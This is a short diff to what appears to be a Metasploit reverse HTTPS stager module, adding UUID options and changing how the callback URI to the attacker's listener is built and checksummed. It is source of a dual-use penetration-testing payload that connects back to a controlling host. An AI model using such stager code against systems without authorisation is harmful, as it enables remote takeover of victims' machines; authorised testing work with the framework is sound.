@@ -5,12 +5,14 @@
 
 require 'msf/core'
 require 'msf/core/handler/reverse_https'
+require 'msf/core/payload/uuid_options'
 
 module Metasploit3
 
   CachedSize = 742
 
   include Msf::Payload::Stager
+  include Msf::Payload::UUIDOptions
 
   def initialize(info = {})
     super(merge_info(info,
@@ -49,7 +51,6 @@ module Metasploit3
 
     target_url << ':'
     target_url << datastore['LPORT'].to_s
-    target_url << '/'
     target_url << generate_callback_uri
 
     proxy_host = datastore['PayloadProxyHost'].to_s
@@ -120,7 +121,7 @@ module Metasploit3
       uri_req_len = 5
     end
 
-    generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITP, uri_req_len)
+    generate_uri_uuid_mode(:init_python, uri_req_len)
   end
 
 end
